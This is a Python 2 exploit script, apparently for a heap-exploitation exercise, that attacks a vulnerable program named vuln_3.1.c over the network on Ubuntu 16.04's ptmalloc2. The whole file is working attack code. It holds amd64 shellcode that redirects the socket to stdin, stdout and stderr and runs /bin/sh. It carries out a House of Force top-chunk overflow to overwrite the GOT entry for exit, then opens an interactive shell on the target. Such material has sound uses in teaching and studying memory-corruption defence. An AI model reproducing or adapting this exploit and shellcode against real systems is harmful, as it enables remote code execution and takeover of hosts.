#!/usr/bin/python

#
# What: Exploit for vuln_3.1.c in ptmalloc2-ubuntu-16.04.4-64bit
# Author: Claes M. Nyberg
# When: Summer 2018
#

import struct
import socket
import sys
import os
import telnetlib
import random
import hashlib
import base64
import binascii

#
# Linux amd64 shellcode dup+execve /bin/sh
#

# dup2(client_fd, STDIN_FILENO)
code  = "\x48\x31\xf6"              # xor    %rsi,%rsi
code += "\x6a\x21"                  # pushq  $0x21
code += "\x58"                      # pop    %rax
code += "\x0f\x05"                  # syscall 

# dup2(client_fd, STDOUT_FILENO)
code += "\x6a\x01"                  # pushq  $0x1
code += "\x5e"                      # pop    %rsi
code += "\x6a\x21"                  # pushq  $0x21
code += "\x58"                      # pop    %rax
code += "\x0f\x05"                  # syscall 

# dup2(client_fd, STDERR_FILENO)
code += "\x6a\x02"                  # pushq  $0x2
code += "\x5e"                      # pop    %rsi
code += "\x6a\x21"                  # pushq  $0x21
code += "\x58"                      # pop    %rax
code += "\x0f\x05"                  # syscall

# execve('/bin/sh', ['/bin/sh', NULL], NULL) 
code += "\x48\xba\x2f\x2f\x62\x69"  # movabs $0x68732f6e69622f2f,%rdx
code += "\x6e\x2f\x73\x68"
code += "\x48\xc1\xea\x08"          # shr    $0x8,%rdx
code += "\x52"                      # push   %rdx
code += "\x48\x89\xe7"              # mov    %rsp,%rdi
code += "\x48\x31\xd2"              # xor    %rdx,%rdx
code += "\x52"                      # push   %rdx
code += "\x57"                      # push   %rdi
code += "\x48\x89\xe6"              # mov    %rsp,%rsi
code += "\x6a\x3b"                  # pushq  $0x3b
code += "\x58"                      # pop    %rax
code += "\x0f\x05"                  # syscall 
code += "\x6a\x3c"                  # pushq  $0x3c
code += "\x58"                      # pop    %rax
code += "\x0f\x05"                  # syscall 


def readuntil(s, content, echo = True):
	x = ""
	while True:
		y = s.recv(1)
		if not y:
			sys.stderr.write('[**] Error: FAILED TO READ FROM SOCKET\n')
			if echo:
				sys.stderr.write(x)
			return False
		x += y
		if x.endswith(content):
			if echo:
				sys.stderr.write(x)
			return x
		
def interact(sock):
	t = telnetlib.Telnet()                                                        
	t.sock = sock                                                                    
	t.interact()

def tcpconn(host, port, lport=0):
	target = (host, port)
	sock = socket.socket()
	bound = ''

	if lport != 0:
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		sock.bind(("", int(lport)))
		bound = " (from local port " + str(lport) + ")"

	print("[+] Connecting to " + target[0] + ":" + str(target[1]) + bound)
	try:
		sock.connect(target)
	except socket.error, msg:
		print("[**] Error: Failed to connect: " + str(msg))
		sys.exit(1)	
	return sock


if len(sys.argv) != 3:
	print "Usage: " + sys.argv[0] + " <ip> <port>"
	sys.exit(0)

s = tcpconn(sys.argv[1], int(sys.argv[2]), 0)

#import time
#time.sleep(10)

#-#-#-#-#-#-#-#-#-#-# Fun Stuff Goes Below

print("[+] Requesting malloc size of 100")
s.send(struct.pack("<Q", int(100)))
readuntil(s, '\n')
first_chunk = int(readuntil(s, '\n'), 16)
first_chunk -= 16
# align16(100 + 8) = 112
top_chunk = first_chunk + 112 
print("[+] first chunk at 0x%x" %(first_chunk))
print("[+] top chunk at 0x%x" %(top_chunk))

new_top_size  = 0xffffffffffffffff
print("[+] Using shellcode of length " + str(len(code)))
print("[+] Overflowing top chunk size with 0x%x" %(new_top_size))
s.send(code.rjust(104, "\x90") + struct.pack("<Q", new_top_size) + "\n")

write_target = 0x601050 # GOT exit
evil_size = (write_target - 16 - (8*2) - top_chunk)
evil_size &= 0xffffffffffffffff # 8 bytes
print("[+] Write target: 0x%x" %(write_target))
print("[+] Using evil size 0x%x" %(evil_size))
s.send(struct.pack("<Q", evil_size))
s.send("\n")
readuntil(s, '\n')

ret_addr = first_chunk + 16
print("[+] Using return address: 0x%x" %(ret_addr))
s.send(struct.pack("<Q", int(32)))
s.send(struct.pack("<Q", ret_addr) + "\n")
readuntil(s, '\n')

s.send("id\n")
interact(s)
sys.exit(0)
